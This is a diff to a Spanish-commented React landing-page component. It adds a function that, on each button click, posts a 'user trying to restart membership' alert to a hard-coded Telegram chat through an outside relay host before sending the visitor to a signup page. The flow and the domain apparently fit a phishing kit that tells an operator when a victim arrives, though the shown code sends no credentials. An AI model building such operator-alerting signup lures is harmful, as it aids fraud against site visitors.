@@ -6,17 +6,47 @@ function Hero() {
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate(); 
 
-  const handleClick = () => {
+  const sendTelegramMessage = async (message) => {
+    try {
+      const chatId = '-4701736581'; // Reemplaza con tu chat ID de Telegram
+      const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ chatId, message }),
+      });
+
+      if (!response.ok) {
+        throw new Error('Error al enviar el mensaje a Telegram');
+      }
+    } catch (error) {
+      console.error('Error:', error);
+    }
+  };
+
+  const handleClick = async () => {
     setLoading(true);
-    setTimeout(() => {
-      navigate('/signup');
-    }, 1000); 
+    
+    try {
+      // Enviar mensaje de Telegram
+      const message = `🚀 Nuevo usuario intentando reiniciar membresía`;
+      await sendTelegramMessage(message);
+
+      // Esperar un poco antes de navegar
+      setTimeout(() => {
+        navigate('/signup');
+      }, 1000);
+    } catch (error) {
+      console.error('Error en handleClick:', error);
+      setLoading(false);
+    }
   };
 
   return (
     <div className="flex flex-col items-center justify-center text-white p-4">
       {loading ? (
-        <Spinner /> // Muestra el spinner si loading es true
+        <Spinner />
       ) : (
         <>
           <h1 className="text-xl sm:text-2xl font-bold text-center mb-2">
